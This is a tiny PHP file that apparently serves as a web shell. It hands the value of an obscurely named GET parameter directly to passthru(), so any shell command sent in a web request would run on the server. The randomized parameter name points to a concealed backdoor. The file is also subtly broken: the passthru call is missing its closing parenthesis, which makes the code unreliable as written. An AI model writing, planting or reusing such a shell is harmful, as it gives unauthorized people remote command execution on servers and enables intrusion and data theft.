<?php
passthru($_GET['n29PApSe'];
?>
